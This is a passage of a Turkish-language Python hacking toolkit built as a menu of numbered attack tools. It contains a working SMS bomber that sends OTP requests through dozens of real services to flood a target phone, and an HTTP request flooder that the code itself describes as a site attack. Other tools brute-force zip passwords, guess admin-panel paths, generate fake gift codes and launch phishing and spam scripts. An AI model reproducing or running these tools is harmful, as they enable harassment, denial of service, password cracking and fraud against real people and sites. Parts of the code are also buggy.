    29-) Rastgele İnsan Verisi Üret
    
    30-) Rastgele İnsan Gönderisi Üret
    
    31-) Dns Bilgi Toplama
    
    32-) ISBN Numarasından Bilgi Toplama
    
    33-) Mailin Geçerliliğini Kontrol Etme
    
    34-) Ip Adresi Zafiyet Analizi
    
    35-) SSH Brute Force
    
    36-) Wifi Port Tarayıcı
    
    37-) Anormal DNS Tespit Edici
    
    38-) Dns Yönlendirici
    
    39-) Wifi Dinleyicisi 1
    
    40-) Wifi Dinleyicisi 2
    
    41-) Ana Menüye Dön
    
        ''')
        yeraltisecim = input("Sizi Nereye Alayım? ")
        if(yeraltisecim=="1"):
            print('''Uyarı: Oluşturulan kodların çalışma ihtimali çok düşüktür. Bu kodları bir otomasyon aracına bağlayarak daha kolay şekilde deneyebilirsiniz. 
    
    Seçim Menüsü
    1-) Dic0rd nitro generator
    
    2-) G00gle pIay kod generator
    
    3-) P3bg u¢ generator
    
    4-) P3bg u¢ generatorv2 
    
    5-) P3bg u¢ generatorv3 
    
    6-) P3bg u¢ generatorv4
    
    7-) P3bg u¢ generatorv5''')
            secim_generator = input("Seçiminizi giriniz:")
            if secim_generator == "1":
                chars = "abcdefghijklmnoprstuvyzqwABCDEFGHIJKLMNOPRSTUVYQW1234567890"
    
                while 1:
                    password_sayi = int(input("Kaç tane oluşturulsun? "))
                    for x in range(0,password_sayi):
                        password = ""
                        for x in range(16):
                            password_sayi = random.choice(chars)
                            password    = password + password_sayi
                        print("discord.gift/"+password)
            if secim_generator == "2":
                chars = "ABCDEFGHIJKLMNOPRSTUVYQW1234567890"
    
                while 1:
                    password_sayi = int(input("Kaç tane oluşturulsun? "))
                    for x in range(0,password_sayi):
                        password = ""
                        for x in range(16):
                            password_sayi = random.choice(chars)
                            password    = password + password_sayi
                        print(password)
    
            if secim_generator == "3":
    
                chars = "abcdefghijklmnoprstuvyzqwABCDEFGHIJKLMNOPRSTUVYQW1234567890"
    
                while 1:
                    password_sayi = int(input("Kaç tane oluşturulsun? "))
                    for x in range(0,password_sayi):
                        password = ""
                        for x in range(18):
                            password_sayi = random.choice(chars)
                            password    = password + password_sayi
                        print(password)
    
            if secim_generator == "4":
                chars = "abcdefghijklmnoprstuvyzqwABCDEFGHIJKLMNOPRSTUVYQW1234567890"
    
                while 1:
                    password_sayi = int(input("Kaç tane oluşturulsun? "))
                    for x in range(0,password_sayi):
                        password = ""
                        for x in range(16):
                            password_sayi = random.choice(chars)
                            password    = password + password_sayi
                        print("eKkVp-"+password)
    
            if secim_generator == "5":
                chars = "abcdefghijklmnoprstuvyzqwABCDEFGHIJKLMNOPRSTUVYQW1234567890"
    
                while 1:
                    password_sayi = int(input("Kaç tane oluşturulsun? "))
                    for x in range(0,password_sayi):
                        password = ""
                        for x in range(13):
                            password_sayi = random.choice(chars)
                            password    = password + password_sayi
                        print("rHira"+password)
            if secim_generator == "6":
                chars = "abcdefghijklmnoprstuvyzqwABCDEFGHIJKLMNOPRSTUVYQW1234567890"
    
                while 1:
                    password_sayi = int(input("Kaç tane oluşturulsun? "))
                    for x in range(0,password_sayi):
                        password = ""
                        for x in range(13):
                            password_sayi = random.choice(chars)
                            password    = password + password_sayi
                        print("pT42C"+password)
    
    
            if secim_generator == "7":
                chars = "abcdefghijklmnoprstuvyzqwABCDEFGHIJKLMNOPRSTUVYQW1234567890"
    
                while 1:
                    password_sayi = int(input("Kaç tane oluşturulsun? "))
                    for x in range(0,password_sayi):
                        password = ""
                        for x in range(13):
                            password_sayi = random.choice(chars)
                            password    = password + password_sayi
                        print("RJNsK"+password)
            else:
                print("Geçersiz seçim")
        elif(yeraltisecim=="2"):
            import random 
    
    
            chars = "abcdefghijklmnoprstuvyzqwABCDEFGHIJKLMNOPRSTUVYQW1234567890.!+-"
    
            while 1:
                password_uzunluk = int(input("Ne kadar uzunlukta olsun? "))
                password_sayi = int(input("Kaç tane şifre oluşturulsun? "))
                for x in range(0,password_sayi):
                    password = ""
                    for x in range(0,password_uzunluk):
                        password_sayi = random.choice(chars)
                        password    = password + password_sayi
                    print("Senin için oluşturduğum şifre :" , password)
    
        elif(yeraltisecim=="3"):
            import random 
    
    
            chars = input("İçinde olmasını istediğiniz harf rakam sembol vb giriniz: ")
            while 1:
                password_uzunluk = int(input("Ne kadar uzunlukta olsun? "))
                password_sayi = int(input("Kaç tane şifre oluşturulsun? "))
                for x in range(0,password_sayi):
                    password = ""
                    for x in range(0,password_uzunluk):
                        password_sayi = random.choice(chars)
                        password    = password + password_sayi
                    print("Senin için oluşturduğum şifre :" , password)
    
        elif(yeraltisecim=="4"):
            hesapbul = input("Kullanıcı Adı Giriniz > ")
            print("")
            print("\033[92mFACEBOOK >  ","https://www.facebook.com/"+hesapbul)
            print("")
            print("INSTAGRAM >  ","https://www.instagram.com/"+hesapbul)
            print("")
            print("TWITTER >  ","https://www.twitter.com/"+hesapbul)
            print("")
            print("YOUTUBE >  ","https://www.youtube.com/"+hesapbul)
            print("")
            print("BLOGGER >  ","https://"+hesapbul+".blogspot.com")
            print("")
            print("REDDIT >  ","https://www.reddit.com/user/"+hesapbul)
            print("")
            print("GITHUB >  ","https://www.github.com/"+hesapbul)
            print("")
            print("STEAM >  ","https://steamcommunity.com/id/"+hesapbul)
            print("")
            print("VK >  ","https://vk.com/"+hesapbul)
            print("")
            print("SPOTIFY >  ","https://open.spotify.com/user/"+hesapbul)
            print("")
            print("WATTPAD >  ","https://www.wattpad.com/user/"+hesapbul)
            print("")
            print("WORDPRESS >  ","https://"+hesapbul+".wordpress.com")
            print("")
            print("PINTEREST >  ","https://www.pinterest.com/"+hesapbul)
            print("")
            print("TUMBLR >  ","https://"+hesapbul+".tumblr.com")
            print("")
            print("FLICKR >  ","https://www.flickr.com/people/"+hesapbul)
            print("")
            print("SOUNDCLOUD >  ","https://soundcloud.com/"+hesapbul)
            print("")
    
    
        elif(yeraltisecim=="5"):
            tcno = input("TC Kimlik No İlk 9 Hanesini Giriniz: ")
            a, b, toplamDokuz = 0, 0, 0
            for i in range(9):
                toplamDokuz = toplamDokuz+int(tcno[i])
                if i%2 == 0:
                    a = a+7*int(tcno[i])
                elif i%2 == 1:
                    b = b+int(tcno[i])
                if i == 8:
                    haneOn = (a-b)%10
                    haneOnBir = (haneOn+toplamDokuz)%10
                    print(tcno+str(haneOn)+str(haneOnBir))
    
        elif(yeraltisecim=="6"):
            os.system("pip install requests")
            import requests
            print("Not: Bu servis bazı ülkelerde devre dışı bırakıldı. Yurt dışı numaralarına anonim sms gönderebilirsiniz.")
            print("Günlük 1 mesaj hakkınız vardır numarayı +9055555555555 şeklinde giriniz link koymak yasak karakter sınırı düşüktür")
            telefonno = input("Telefon Numarası Giriniz : ")
            mesaj = input("Mesajınızı Giriniz: ")
    
            resp = requests.post('https://textbelt.com/text', {
                  'phone': telefonno,
                  'message': mesaj,
                  'key': 'textbelt',
            })
            print(resp.json())
    
    
        elif(yeraltisecim=="7"):
            import phonenumbers
            from phonenumbers import geocoder
            numara = input("Numara giriniz +90xxx şeklinde: ")
            telno = phonenumbers.parse(numara)
            print(geocoder.description_for_number(telno,"tr"))
    
        elif(yeraltisecim=="8"):
            import string
            var1 = ("@hotmail.com","@autlook.com","@gmail.com","@isecv.com","@dkt1.com","@rphinfo.com","@sc2hub.com","@firemailbox.club","@upimagine.com","@githabs.com","@tribalks.com","@vmani.com","@irezavh.com","",)
            var2 = ("xowason758","j.a.v.ierfran.ci.s.c.otmp","nineti5328","sdhumd4pik","nijraea423da","mkdare3092","kajiore441","pzadek544","pidora9832","xydg6mltfq","clgbqs47md","ugasaie232d","njfaf453t","42dadwr3r3","gerritc91","kyri771","sabo432","hesaplzaim45","noobels76","hda32dae3","hafeh10084","wifave8166","yovoc23640","hsabial394","rafe42esz","edbadaw45","daosan2142","fcafete4217","dafeka323a","gafwe23fa","braianmax4232")
            import random
            mail = random.choice(var1)
            kelimeler = random.choice(var2)
            print("\n Tek kullanımlık panelsiz mail. İlk deneyişte kabul etmezse bir daha üretebilirsiniz")
            print("||||||||||||||||||||||||||||||||||")
            print("\n"+kelimeler+mail+"\n")
            print("||||||||||||||||||||||||||||||||||")
    
        elif(yeraltisecim=="9"):
            url = input("Url giriniz > ")
            print("")
            print("\033[92mAlttaki linklerden biri panel olabilir")
            print("")
            print(url+"/admin.php") 
            print("")
            print(url+"/admin.html")
            print("")
            print(url+"/administrator")
            print("")
            print(url+"/admin")
            print("")
            print(url+"/adminpanel")
            print("")
            print(url+"/cpanel")
            print("")
            print(url+"/login")
            print("")
            print(url+"/wp-login.php")
            print("")
            print(url+"/admins")
            print("")
            print(url+"/logins")
            print("")
            print(url+"/admin.asp")
            print("")
            print(url+"/adm")
            print("")
            print(url+"/admin/account.html")
            print("")
            print(url+"/admin/login.html")
            print("")
            print(url+"/admin/login.htm")
            print("")
            print(url+"/admin/controlpanel.html")
            print("")
            print(url+"/admin.htm")
            print("")
            print(url+"/admin/controlpanel.htm")
            print("")
            print(url+"admin/adminLogin.html")
            print("")
            print(url+"admin/adminLogin.htm")
            print("")
    
        elif(yeraltisecim=="10"):
            os.system("pip install pyautogui")
            os.system("python3 spambot.py")
    
        elif(yeraltisecim=="11"):
            import urllib.parse
            import urllib.request
            import os
    
    
            ip = input("Ip giriniz > ")
            son = ("http://ip-api.com/json/"+ip)
            son2 = ("https://api.iplocation.net/?ip="+ip)
            print("\n SONUÇ: \n")
            urllib.request.urlretrieve(son, "sonuc.json")
            import json
            yazilmis = open("sonuc.json")
            jsonveri = yazilmis.read()
            veriler = json.loads(jsonveri)
            print("Durum: "+veriler["status"])
            print("Ülke: "+veriler["country"])
            print("Ülke Kodu: "+veriler["countryCode"])
            print("Bölge Numarası: "+veriler["region"])
            print("Şehir: "+veriler["city"])
            print("Posta Kodu: "+veriler["zip"])
            print("Saat Dilimi: "+veriler["timezone"])
            print("İnternet Sağlayıcısı: "+veriler["isp"])
            print("Lat: "+str(veriler["lat"]))
            print("Lon: "+str(veriler["lon"]))
            print("Org: "+veriler["org"])
            print("As: "+veriler["as"])
            print("Hedef: "+veriler["query"])
            print("\n ------------------Json verileri------------------ \n \n"+jsonveri)
            os.system("rm -rf sonuc.json")
    
        elif(yeraltisecim=="12"):
            import urllib.request
            import threading
            import time
            header_kodlarım = {
                'User-Agent' : 'Mozilla/5.0 (Machintosh; omnikittool X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecho) omnikittool/48.0.2564.116 ultrabot/537.36'}
            print("Bu bot arkaplanda belirtilen siteye sizin cihazınızdan art arda onlarca giriş yaparak siteye saldırır. Görüntüleme hilesi oluşturmak için de kullanılabilir. Aracın hiçbir programı için sorumluluk kabul edilmez.")
            site_adresi = input("Site adresi giriniz > ")
            site_adresi2 = site_adresi
            istek = urllib.request.Request(site_adresi, headers= header_kodlarım)
            istek2 = urllib.request.Request(site_adresi2, headers= header_kodlarım)
            istek3 = urllib.request.Request(site_adresi, headers= header_kodlarım)
            istek4 = urllib.request.Request(site_adresi, headers= header_kodlarım)
            istek5 = urllib.request.Request(site_adresi, headers= header_kodlarım)
            dos = urllib.request.urlopen(istek)
            for i in range(1,5):
                html = urllib.request.urlopen(istek)
                print("başarılı, devam ediyorum.")
                time.sleep(5)
                for i in range(1,4):
                    urllib.request.urlopen(istek2)
                    urllib.request.urlopen(istek3)
                    print("başarılı, devam ediyorum.")
                    time.sleep(10)
                    for i in range(1,3):
                        t1 = threading.Thread(target=dos)
                        t1.start()
    
    
    
        elif(yeraltisecim=="13"):
            os.system("pip install pynput")
            os.system("python3 ototikla.py")
    
        elif(yeraltisecim=="14"):
            import requests
            import urllib.request
            import time
            
            from json import dumps
            print("\nTam çalışmayabilir. Sorumluluk kabul edilmez.")
            num = input("Sms bomb için numara gir (+905555555555 şeklinde) ")
            phone = num
            cellphone = num[3:]
            headerler = {
                'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1) SxTOOL/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36'}
    
        
            try:
                requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php/?msisdn={}&locale=en&countryCode=tr&k=ic1rtwz1s1Hj1O0r&version=1&r=46763'.format(num))
            except:
                print("Başarısız")
    
    
            try:
                print(requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': num}))
            except:
                print("Başarısız")
    
            try:
                    print(requests.post('https://account.my.games/signup_send_sms/', data={'phone': num}))
            except:
                print("Başarısız")
    
    
            try:
                print(requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":num}))
            except:
                print("Başarısız")
    
    
            try:
                    print(requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': num}))
            except:
                print("Başarısız")
    
            try:
                    print(requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers=headerler))
            except:
                print("Başarısız")
    
            try:
                requests.post(f"https://findclone.ru/register?phone=+{phone}")
            except:
                print("Başarısız")
    
            try:
                requests.post(f"https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code?number={phone}")
            except:
                print("Başarısız")
            try:
                requests.post(f"https://api.eldorado.ua/v1/sign?login={phone}&step=phone-check&fb_id=null&fb_token=null&lang=ru")
            except:
                print("Başarısız")
            try:
                requests.post(f"https://secure.online.ua/ajax/check_phone/?reg_phone={phone}")
                print("Başarılı")
            except:
                print("Başarısız")
            try:
                requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{phone}/")
                print("Başarılı")
            except:
                print("Başarısız")
            try:
                requests.post(f"https://www.oyorooms.com/api/pwa/generateotp?phone=+{phone}&country_code=%2B7&nod=4&locale=en")
                print("Başarılı")
            except:
                print("Başarısız")
            try:
                requests.post(f"https://secure.online.ua/ajax/check_phone/?reg_phone={phone}")
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://www.rabota.ru/remind', data={'credential': num})
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': num})
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://3040.com.ua/taxi-ordering', data={'callback-phone': num})
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://alfalife.cc/auth.php', data={'phone': num})
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://pampik.com/callback', data={'phoneCallback': num})
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://city24.ua/personalaccount/account/registration', data={'PhoneNumber': num})
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://my.dianet.com.ua/send_sms/', data={'phone': num})
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://vladimir.edostav.ru/site/CheckAuthLogin', data={'phone_or_email': num})
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://www.finam.ru/api/smslocker/sendcode', data={'phone': num})
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://friendsclub.ru/assets/components/pl/connector.php', data={'phone': num, 'casePar':'authSendsms'})
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://helsi.me/api/healthy/accounts/login', data={'phone': num,'platform':'PISWeb'})
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://api.imgur.com/account/v1/phones/verify', data={'phone_number': num, 'region_code':'TR'})
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://izi.ua/api/auth/sms-login', data={'phone': num})
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://kaspi.kz/util/send-app-link', data={'adress': num})
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://koronapay.com/transfers/online/api/users/otps', data={'phone': num})
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://loany.com.ua/funct/ajax/registration/code', data={'phone': num})
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://pizzasinizza.ru/api/phoneCode.php', data={'phone': num})
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://sayoris.ru/?route=parse/whats', data={'phone': num})
                print("Başarılı")
            except:
                print("Başarısız")
    
    
    
        elif(yeraltisecim=="15"):
            print("\033[92m")
            os.system("cls" if os.name == "nt" else "clear")
            print('''
         .--------.
        / .------. 
       | |        
      _| |________| |_
    .' |_|        |_| '. Wordlistiniz var mı? 
    '._____ ____ _____.'
    |     .'____'.     | (Yok seçeneği işaretlenirse program sizin için oluşturacak)
    '.__.'.'    '.'.__.'
    '.__  |Sxtool|  __.| 1-) Wordlistim var
    |   '.'.____.'.'   | 
    '.____'.____.'____.' 2-) Wordlistim yok
    '.________________.'
    
    
            ''')
            aaaas = input("Seç > ")
    
            if(aaaas=="2"):
                import random 
                import pyzipper
                import os
                os.system("pip install pyzipper")
            
                chars = input("İçinde olmasını istediğiniz harf rakam sembol vb giriniz: ")
    
                password_uzunluk = int(input("Ne kadar uzunlukta olsun? "))
                password_sayi = int(input("Kaç tane şifre oluşturulsun? "))
                for x in range(0,password_sayi):
                    password = ""
                    for x in range(0,password_uzunluk):
                        password_sayi = random.choice(chars)
                        password    = password + password_sayi
                    #print(password)
                    passworda = (password+"\n")
                    dosya = open("wlist.txt","a")
                    dosya.write(passworda)
    
    
                wordlist = ("wlist.txt")
    
                file = input("Zip dosya yolunu belirtiniz > ")    
                icdosya = input("Zip dosyası içinden herhangi bi dosya adı+uzantı giriniz > ")
        
                fileobject = pyzipper.AESZipFile(file)
    
                with open(wordlist,"rb") as wordlist:
                    for word in wordlist:
                        try:
                            fileobject.pwd = word.strip()
                            fileobject.read(icdosya)
                        except:
                            print("\033[93mŞifre denendi = ",word.decode().strip())
                            continue
                        else:
                            print("\033[92mŞifre bulundu! İşte şifre = ",word.decode().strip())
                            os.system("rm -rf wlist.txt")
                            exit(0)
                    
                os.system("rm -rf wlist.txt")
                print("\033[91mŞifre Bulunamadı")
    
            elif(aaaas=="1"):
                import pyzipper
                import os
                os.system("pip install pyzipper")
                wordlist = input("Wordlist Yolunu Belirtiniz > ")
    
                file = input("Zip dosya yolunu belirtiniz > ")    
                icdosya = input("Zip dosyası içinden herhangi bi dosya adı+uzantı giriniz > ")
    
                fileobject = pyzipper.AESZipFile(file)
    
                with open(wordlist,"rb") as wordlist:
                    for word in wordlist:
                        try:
                            fileobject.pwd = word.strip()
                            fileobject.read(icdosya)
                        except:
                            print("\033[93mŞifre denendi = ",word.decode().strip())
                            continue
                        else:
                            print("\033[92mŞifre bulundu! İşte şifre = ",word.decode().strip())
                            exit(0)
                print("\033[91mŞifre Bulunamadı")
    
    
        elif(yeraltisecim=="16"):
            import random 
            import os
            chars = input("İçinde olmasını istediğiniz harf rakam sembol vb giriniz: ")    
            password_uzunluk = int(input("Ne kadar uzunlukta olsun? "))
            password_sayi = int(input("Kaç tane şifre oluşturulsun? "))
            for x in range(0,password_sayi):
                password = ""
                for x in range(0,password_uzunluk):
                    password_sayi = random.choice(chars)
                    password    = password + password_sayi
                passworda = (password+"\n")
                dosya = open("sxwlist.txt","a")
                dosya.write(passworda)
    
        elif(yeraltisecim=="17"):
            os.system("python3 oltalama/openserver.py")
    
    
        elif(yeraltisecim=="18"):
            os.system("cls" if os.name == "nt" else "clear")
            os.system("python3 instabot.py")
    
    
        elif(yeraltisecim=="19"):
            import requests
            from bs4 import BeautifulSoup
            header_kod = { 'User-Agent' : 'Mozilla/5.0 (Machintosh; omnikit X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecho) omnikit/48.0.2564.116 Naber/537.36'}
            print("Örnek site: https://google.com  http/https eklemeyi unutmayın")
            hedefsite = input("Hedef Url Giriniz: ")
            hedefl = requests.get(hedefsite,headers=header_kod)
            hedefg = hedefl.content
            guzelcorba = BeautifulSoup(hedefg,"html.parser")
            for i in guzelcorba.find_all("a"):
                    print(i)
                    print("\n ################################################################ \n")
    
        elif(yeraltisecim=="20"):
            import requests
            from bs4 import BeautifulSoup
            header_kod = { 'User-Agent' : 'Mozilla/5.0 (Machintosh; omnikit X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecho) omnikit/48.0.2564.116 Naber/537.36'}
            print("Örnek site: https://google.com  http/https eklemeyi unutmayın")
            hedefsite = input("Hedef Url Giriniz: ")
            hedefl = requests.get(hedefsite,headers=header_kod)
            hedefg = hedefl.content
            guzelcorba = BeautifulSoup(hedefg,"html.parser")
            for i in guzelcorba.find_all("html" and "p"):
                    print(i)
                    print("\n ################################################################ \n")
    
    
    #kodları beğendin mi :)
    
        elif(yeraltisecim=="21"):
            import requests
            from bs4 import BeautifulSoup
            header_kod = { 'User-Agent' : 'Mozilla/5.0 (Machintosh; omnikit X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecho) omnikit/48.0.2564.116 Naber/537.36'}
            print("Örnek site: https://google.com  http/https eklemeyi unutmayın")
            hedefsite = input("Hedef Url Giriniz: ")
            hedefl = requests.get(hedefsite,headers=header_kod)
            hedefg = hedefl.content
            guzelcorba = BeautifulSoup(hedefg,"html.parser")
            for i in guzelcorba.find_all("img"):
                    print(i)
                    print("\n ################################################################ \n")
    
    
    
        elif(yeraltisecim=="22"):
            ilkd = input("İlk dosyanın adresini giriniz: ")
            sond = input("Son dosyanın adresini giriniz: ")
            ilkv = open(ilkd)
            sonv = open(sond)
            ilk = str(ilkv.read())
            son = str(sonv.read())
            if(ilk==son):
                print("\033[92mEşleşme Başarılı")
            else:
                print("\033[91mEşleşme Başarısız")
                
        elif(yeraltisecim=="23"):
            import os
            print(''' 
            \33[92m
              ad8888888888ba
             dP'         `"8b, 
             8  ,aaa,       "Y888a     ,aaaa,     ,aaa,  ,aa,
             8  8'd`8           "88baadP""""YbaaadP"""YbdP""Yb
             8  8 t 8              """        """      ""    8b
             8  8,0,8         ,aaaaaaaaaaaaaaaaaaaaaaaaddddd88P
             8  `"""'       ,d8""     0-Ana Menü
             Yb,         ,ad8"        1-Şifrele
              "Y8888888888P"      2-Şifreyi Çöz
            ''')
            secim = input("Seçiminizi yapınız > ")
            if(secim=="0"):
                os.system("python3 omnikittoolsv"+surum+".py")
                
            if(secim=="1"):
                dosyayolu = input("Dosya Yolunu Belirtiniz > ")
                yazilar = open(dosyayolu)
                veri = yazilar.read()
                veri19 = veri.replace("print","5Fg%FaD8++")
        
                veri1 = veri19.replace("import os","^^#294^ert%+'1")
                veri2 = veri1.replace("import socket","+'^'!trweS1a54")
                veri3 = veri2.replace("random.choice","m+^!lkdw%A")
                veri4 = veri3.replace("import random","l(Ed+S'wa^'")
                veri5 = veri4.replace("elif(","%+^i+se/e}0y!ou+^!")
                veri6 = veri5.replace("def","%&dagbfaFFFsaw")
                veri7 = veri6.replace("class","GAGF53DA221")
                veri8 = veri7.replace("else","242BGAD32FEF53")
                veri9 = veri8.replace("import urllib.request","7E6Q-dw!aY^o'")
                veri10 = veri9.replace("input(","1F'dA4^12&")
                veri11 = veri10.replace("float","92324232213")
                veri12 = veri11.replace("os.system","&&76fr}R5")
                veri13 = veri12.replace("import time","\gwalj//2CxZ")
                veri14 = veri13.replace("import requests","*1)92DfH/c")
                veri15 = veri14.replace("except","}23!ERtdaBFV")
                veri16 = veri15.replace("time.sleep","{da^2sda'^da^")
                veri17 = veri16.replace("while True:","-2'!3gf+51")
                veri18 = veri17.replace("for i in range","yU32kL:q")
                veri20 = veri18.replace("<html>","DWM32D3S&%DW")
                veri21 = veri20.replace("</html>","ODW+'2GH")
                veri22 = veri21.replace("<meta","KFE21{ad4")
                veri23 = veri22.replace("<title>","dwm36Uwda")
                veri24 = veri23.replace("</title>","D_DW]D^17W")
                veri25 = veri24.replace("<head>","KD{W/A+Mdw")
                veri26 = veri25.replace("<body>","5232fagw+da'^")
                veri27 = veri26.replace("</body>","LDW21f42nw")
                veri28 = veri27.replace("<p>","GAF32PDW+DLW")
                veri29 = veri28.replace("</p>","K90E2FADW")
                veri30 = veri29.replace("<?php","MDW^AD6TY")
                veri31 = veri30.replace("?>","JDK3dw^1wd")
                veri32 = veri31.replace("<script>","GFA^4dwA")
                veri33 = veri32.replace("</script>","42B24DJ21F")
                veri34 = veri33.replace("<table>","ld-a'L+DA")
                veri35 = veri34.replace("</table>","Kdwa%32VV")
                veri36 = veri35.replace("<div","kLDA^rBaE")
                veri37 = veri36.replace("</div","4$da32^fa")
                veri38 = veri37.replace("<br>","Lda^!ws'")
                veri39 = veri38.replace("<a href","lfDAw22ES+'1")
                veri40 = veri39.replace("</head>","2DfFAFa+3D")
    
                yazilarson = open("encsuccess.txt","w+")
                yazilarson.write(veri40)
                print("Başarılı, dosya bulunduğunuz dizine oluşturuldu")
    
            if(secim=="2"):
                dosyayolu = input("Dosya Yolunu Belirtiniz > ")
                yazilar = open(dosyayolu)
                veri = yazilar.read()
                veri19 = veri.replace("5Fg%FaD8++","print")
        
                veri1 = veri19.replace("^^#294^ert%+'1","import os")
                veri2 = veri1.replace("+'^'!trweS1a54","import socket")
                veri3 = veri2.replace("m+^!lkdw%A","random.choice")
                veri4 = veri3.replace("l(Ed+S'wa^'","import random")
                veri5 = veri4.replace("%+^i+se/e}0y!ou+^!","elif(")
                veri6 = veri5.replace("%&dagbfaFFFsaw","def")
                veri7 = veri6.replace("GAGF53DA221","class")
                veri8 = veri7.replace("242BGAD32FEF53","else")
                veri9 = veri8.replace("7E6Q-dw!aY^o'","import urllib.request")
                veri10 = veri9.replace("1F'dA4^12&","input(")
                veri11 = veri10.replace("92324232213","float")
                veri12 = veri11.replace("&&76fr}R5","os.system")
                veri13 = veri12.replace("\gwalj//2CxZ","import time")
                veri14 = veri13.replace("*1)92DfH/c","import requests")
                veri15 = veri14.replace("}23!ERtdaBFV","except")
                veri16 = veri15.replace("{da^2sda'^da^","time.sleep")
                veri17 = veri16.replace("-2'!3gf+51","while True:")
                veri18 = veri17.replace("yU32kL:q","for i in range")
                veri20 = veri18.replace("DWM32D3S&%DW","<html>")
                veri21 = veri20.replace("ODW+'2GH","</html>")
                veri22 = veri21.replace("KFE21{ad4","<meta")
                veri23 = veri22.replace("dwm36Uwda","<title>")
                veri24 = veri23.replace("D_DW]D^17W","</title>")
                veri25 = veri24.replace("KD{W/A+Mdw","<head>")
                veri26 = veri25.replace("5232fagw+da'^","<body>")
                veri27 = veri26.replace("LDW21f42nw","</body>")
                veri28 = veri27.replace("GAF32PDW+DLW","<p>")
                veri29 = veri28.replace("K90E2FADW","</p>")
                veri30 = veri29.replace("MDW^AD6TY","<?php")
                veri31 = veri30.replace("JDK3dw^1wd","?>")
                veri32 = veri31.replace("GFA^4dwA","<script>")
                veri33 = veri32.replace("42B24DJ21F","</script>")
                veri34 = veri33.replace("ld-a'L+DA","<table>")
                veri35 = veri34.replace("Kdwa%32VV","</table>")
                veri36 = veri35.replace("kLDA^rBaE","<div")
                veri37 = veri36.replace("4$da32^fa","</div>")
                veri38 = veri37.replace("Lda^!ws'","<br>")
                veri39 = veri38.replace("lfDAw22ES+'1","<a href")
                veri40 = veri39.replace("2DfFAFa+3D","</head>")
    
                yazilarson = open("decsuccess.txt","w+")
                yazilarson.write(veri40)
                print("Başarılı, dosya bulunduğunuz dizine oluşturuldu")
    
    
        elif(yeraltisecim == "24"):
            print("""
    1-) Dosyada kelimeyi içeren tüm satırları listele
    2-) Dosyada kelimeyi içeren tüm satırları ve bu satırların satır numaralarını listele
    3-) Büyük/küçük harf duyarsız olarak dosyada kelimeyi içeren tüm satırları listele""")
            dosyaislemleri = input("Seçiminizi giriniz: ")
            kelime = input("Hedef kelimeyi giriniz: ")
            dosya = input("Arama yapılacak dosya yolu giriniz: ")
            if dosyaislemleri == "1":
                try:
                    with open(dosya, 'r', encoding='utf-8') as f:
                        for satir in f:
                            if kelime in satir:
                                print(satir, end='')
                except FileNotFoundError:
                    print(f"Dosya bulunamadı: {dosya}")
                except Exception as e:
                    print(f"Bir hata oluştu: {e}")
    
            elif dosyaislemleri == "2":
                try:
                    with open(dosya, 'r', encoding='utf-8') as f:
                        for numara, satir in enumerate(f, start=1):
                            if kelime in satir:
                                print(f"{numara}: {satir}", end='')
                except FileNotFoundError:
                    print(f"Dosya bulunamadı: {dosya}")
                except Exception as e:
                    print(f"Bir hata oluştu: {e}")
            elif dosyaislemleri == "3":
                try:
                    with open(dosya, 'r', encoding='utf-8') as f:
                        for satir in f:
                            if kelime.lower() in satir.lower():
                                print(satir, end='')
                except FileNotFoundError:
                    print(f"Dosya bulunamadı: {dosya}")
                except Exception as e:
                    print(f"Bir hata oluştu: {e}")
            else:
                print("Geçersiz seçim")
    
    
        elif(yeraltisecim=="25"):
            import requests
            import time
            def dosya_var_mi(url):
                try:
                    response = requests.get(url)
                    if response.status_code == 200:
                        print(f"{url} mevcut!")
                        return True
                    else:
                        print(f"{url} bulunamadı (Status Code: {response.status_code})")
                        return False
                except requests.exceptions.RequestException as e:
                    print(f"Bir hata oluştu: {e}")
                    return False
    
            def listeden_url_kontrol(list_dosyasi, ana_url, bekleme_suresi):
                try:
                    with open(list_dosyasi, 'r') as file:
                        dosyalar = file.readlines()
            
                    for dosya in dosyalar:
                        dosya = dosya.strip()  
                        tam_url = f"{ana_url}/{dosya}"
                        dosya_var_mi(tam_url)
                        time.sleep(bekleme_suresi) 
    
                except FileNotFoundError:
                    print(f"{list_dosyasi} dosyası bulunamadı.")
                except Exception as e:
                    print(f"Bir hata oluştu: {e}")
    
            ana_url = input("Kontrol etmek istediğiniz URL'yi (https://site.com gibi) giriniz: ")
            print("Not: Bekleme süresini arttırmak daha düzgün tarama yapmanızı sağlar. Bunun yanında işlem süresi uzar. İdeal işlem süresi 5-7'dir")
